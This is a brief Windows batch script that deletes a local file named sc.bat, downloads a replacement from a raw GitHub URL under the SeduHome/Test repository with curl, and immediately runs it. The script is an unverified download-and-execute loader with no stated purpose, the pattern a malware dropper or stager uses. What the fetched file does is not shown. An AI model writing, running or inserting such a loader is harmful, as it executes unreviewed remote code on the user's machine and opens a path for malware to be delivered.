@echo off
del sc.bat /a /q
timeout /t 2 /nobreak >nul
curl https://raw.githubusercontent.com/SeduHome/Test/main/sc.bat>sc.bat
timeout /t 2 /nobreak >nul
start sc.bat
timeout /t 4 /nobreak >nul